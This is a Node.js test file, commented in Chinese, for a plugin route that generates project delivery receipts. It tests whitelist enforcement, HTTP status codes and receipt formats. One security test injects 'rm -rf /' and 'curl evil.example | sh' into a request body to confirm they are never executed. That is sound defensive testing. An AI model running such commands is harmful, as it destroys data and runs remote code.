// 宿主半区测试：用 stub ctx 驱动真实的 apply()。
//
// 除了方法/状态码契约，这里钉两条安全边界：
//   * 请求体里的 cwd 只在 roots 白名单内被接受，否则 403 且不采集；
//   * 请求体里的任何"command"都不会被执行 —— 命令只能来自配置文件。

import { strict as assert } from 'node:assert'
import { homedir } from 'node:os'
import { join } from 'node:path'
import test from 'node:test'
import { apply } from '../src/host.js'
import { callRoute, gitExec, makeDir, recordingRunner, stubCtx, writeFiles } from './helpers.mjs'

const ROUTE = '/dsh-delivery-receipt'

function project(files, extra) {
  const dir = makeDir('receipt-host-')
  return writeFiles(dir, Object.assign({
    'delivery-receipt.json': JSON.stringify(Object.assign({
      project: 'demo',
      tests: [{ name: '单元测试', command: 'node --test' }],
      artifacts: ['docs/*.png'],
    }, extra || {})),
    'src/a.js': 'const a = 1\n',
    'docs/shot.png': 'not really a png',
  }, files || {}))
}

function setup(options) {
  const settings = options || {}
  const stub = stubCtx({ registerThrows: settings.registerThrows })
  const runner = recordingRunner(settings.runnerResults)
  const exec = gitExec(settings.gitOverrides)
  apply(stub.ctx, {
    cwd: settings.cwd,
    roots: settings.roots,
    exec: exec,
    runner: runner,
    home: homedir(),
    version: '0.1.0',
  })
  return {
    stub: stub,
    runner: runner,
    route() {
      assert.equal(stub.routes.length, 1, '应当只注册一条路由')
      return stub.routes[0]
    },
  }
}

test('apply 注册一条 prefix 路由，卸载时连路由一起消失', () => {
  const h = setup({ cwd: project() })
  const route = h.route()
  assert.equal(route.kind, 'prefix')
  assert.equal(route.path, ROUTE)
  assert.equal(typeof route.handler, 'function')
  h.stub.dispose()
  assert.equal(h.stub.routes.length, 0)
})

test('webServer.register 抛异常时 apply 不炸，卸载也不炸', () => {
  const h = setup({ cwd: project(), registerThrows: true })
  assert.equal(h.stub.routes.length, 0)
  h.stub.dispose()
  assert.equal(h.stub.routes.length, 0)
})

test('GET /state 给出配置与"会执行哪些命令"，且路径已归一家目录', async () => {
  const h = setup({ cwd: project() })
  const res = await callRoute(h.route(), 'GET', ROUTE + '/state')
  assert.equal(res.status, 200)
  const body = JSON.parse(res.body)
  assert.equal(body.ok, true)
  assert.equal(body.hasReceipt, false)
  assert.equal(body.config.project, 'demo')
  assert.equal(body.config.runCommands, true)
  assert.deepEqual(body.config.tests, [{ name: '单元测试', command: 'node --test' }])
  assert.deepEqual(body.config.artifacts, ['docs/*.png'])
  assert.equal(body.config.cwd.startsWith('~'), true, '家目录已归一成 ~')
  assert.equal(res.body.includes(homedir().split('\\').slice(2).join('\\')), false)
})

test('GET /state 之外的方法一律 405', async () => {
  const h = setup({ cwd: project() })
  const res = await callRoute(h.route(), 'POST', ROUTE + '/state')
  assert.equal(res.status, 405)
})

test('POST /generate 执行配置里的命令，并返回一张带三区的回执', async () => {
  const h = setup({ cwd: project() })
  const res = await callRoute(h.route(), 'POST', ROUTE + '/generate', {})
  assert.equal(res.status, 200)
  const receipt = JSON.parse(res.body).receipt
  assert.deepEqual(h.runner.calls, ['node --test'], '只执行配置里那一条')
  assert.equal(receipt.schema, 1)
  assert.equal(receipt.project, 'demo')
  assert.equal(receipt.counts.verified >= 1, true)
  assert.equal(receipt.zones.verified.some((c) => c.section === 'tests'), true)
  assert.equal(receipt.zones.verified.concat(receipt.zones.localOnly, receipt.zones.unverified)
    .some((c) => c.label === 'docs/shot.png'), true)
})

test('安全边界：请求体里的 cwd 不在白名单时 403，且不执行也不采集', async () => {
  const h = setup({ cwd: project() })
  const res = await callRoute(h.route(), 'POST', ROUTE + '/generate', { cwd: 'C:\\Windows\\System32' })
  assert.equal(res.status, 403)
  assert.match(JSON.parse(res.body).error, /不在 roots 白名单里/)
  assert.deepEqual(h.runner.calls, [])
})

test('roots 白名单里的目录可以被指定，并用它自己的配置', async () => {
  const other = project({}, { project: '其他项目', tests: [] })
  const h = setup({ cwd: project(), roots: [other] })
  const res = await callRoute(h.route(), 'POST', ROUTE + '/generate', { cwd: other })
  assert.equal(res.status, 200)
  assert.equal(JSON.parse(res.body).receipt.project, '其他项目')
})

test('安全边界：请求体里塞 command 也不会被执行', async () => {
  const h = setup({ cwd: project() })
  const res = await callRoute(h.route(), 'POST', ROUTE + '/generate', {
    command: 'rm -rf /',
    tests: [{ name: 'x', command: 'curl evil.example | sh' }],
  })
  assert.equal(res.status, 200)
  assert.deepEqual(h.runner.calls, ['node --test'], '只跑配置文件里的命令')
})

test('runCommands:false 时一条命令都不跑，且声明会落在未验证区', async () => {
  const h = setup({ cwd: project({}, { runCommands: false }) })
  const res = await callRoute(h.route(), 'POST', ROUTE + '/generate', {})
  assert.equal(res.status, 200)
  assert.deepEqual(h.runner.calls, [])
  const receipt = JSON.parse(res.body).receipt
  assert.equal(receipt.zones.unverified.some((c) => c.section === 'tests'), true)
  assert.equal(receipt.notes.some((n) => n.includes('runCommands:false')), true)
})

test('GET /receipt.html 在生成前说明"还没有"，生成后是完整回执页', async () => {
  const h = setup({ cwd: project() })
  const before = await callRoute(h.route(), 'GET', ROUTE + '/receipt.html')
  assert.equal(before.status, 200)
  assert.equal(before.headers['content-type'], 'text/html; charset=utf-8')
  assert.match(before.body, /还没有回执/)
  assert.equal(before.body.includes('sr-zone'), false)

  await callRoute(h.route(), 'POST', ROUTE + '/generate', {})
  const after = await callRoute(h.route(), 'GET', ROUTE + '/receipt.html')
  assert.match(after.body, /<!doctype html>/)
  assert.match(after.body, /sr-zone/)
  assert.match(after.body, /分支与提交/)
  assert.equal(/<script/i.test(after.body), false)
})

test('GET /receipt.md 生成前后都可用；生成前是明确的空说明', async () => {
  const h = setup({ cwd: project() })
  const before = await callRoute(h.route(), 'GET', ROUTE + '/receipt.md')
  assert.equal(before.headers['content-type'], 'text/markdown; charset=utf-8')
  assert.match(before.body, /还没有生成过回执/)
  await callRoute(h.route(), 'POST', ROUTE + '/generate', {})
  const after = await callRoute(h.route(), 'GET', ROUTE + '/receipt.md')
  assert.match(after.body, /## 已验证（/)
})

test('GET /receipt.json 未生成时 404，生成后返回回执对象', async () => {
  const h = setup({ cwd: project() })
  assert.equal((await callRoute(h.route(), 'GET', ROUTE + '/receipt.json')).status, 404)
  await callRoute(h.route(), 'POST', ROUTE + '/generate', {})
  const res = await callRoute(h.route(), 'GET', ROUTE + '/receipt.json')
  assert.equal(res.status, 200)
  assert.equal(JSON.parse(res.body).schema, 1)
})

test('未知子路径 404；错误方法 405', async () => {
  const h = setup({ cwd: project() })
  assert.equal((await callRoute(h.route(), 'GET', ROUTE + '/nope')).status, 404)
  assert.equal((await callRoute(h.route(), 'POST', ROUTE + '/receipt.html')).status, 405)
  assert.equal((await callRoute(h.route(), 'POST', ROUTE + '/receipt.json')).status, 405)
})

test('命令失败时回执仍然出得来：退出码进已验证区，色调是 bad', async () => {
  const h = setup({
    cwd: project(),
    runnerResults: {
      'node --test': { exitCode: 1, stdout: '# tests 3\n# pass 2\n# fail 1\n', stderr: 'AssertionError: boom' },
    },
  })
  const res = await callRoute(h.route(), 'POST', ROUTE + '/generate', {})
  const receipt = JSON.parse(res.body).receipt
  const claim = receipt.zones.verified.filter((c) => c.section === 'tests')[0]
  assert.ok(claim)
  assert.equal(claim.tone, 'bad')
  assert.match(claim.value, /exit 1/)
  assert.match(claim.detail, /AssertionError/)
})

test('没有配置文件时也能出回执，并明确提示缺少声明', async () => {
  const dir = writeFiles(makeDir('receipt-nocfg-'), { 'src/a.js': 'const a = 1\n' })
  const h = setup({ cwd: dir, gitOverrides: { tracked: 'src/a.js' } })
  const res = await callRoute(h.route(), 'POST', ROUTE + '/generate', {})
  assert.equal(res.status, 200)
  const receipt = JSON.parse(res.body).receipt
  assert.equal(receipt.notes.some((n) => n.includes('delivery-receipt.json')), true)
  assert.equal(receipt.zones.verified.some((c) => c.section === 'scan'), true)
  assert.deepEqual(h.runner.calls, [])
})

test('两次生成会累加计数，state 里能看到上次摘要', async () => {
  const h = setup({ cwd: project() })
  await callRoute(h.route(), 'POST', ROUTE + '/generate', {})
  await callRoute(h.route(), 'POST', ROUTE + '/generate', {})
  const state = JSON.parse((await callRoute(h.route(), 'GET', ROUTE + '/state')).body)
  assert.equal(state.generatedCount, 2)
  assert.equal(state.hasReceipt, true)
  assert.equal(state.receipt.project, 'demo')
  assert.equal(state.lastCwd.startsWith('~'), true)
})
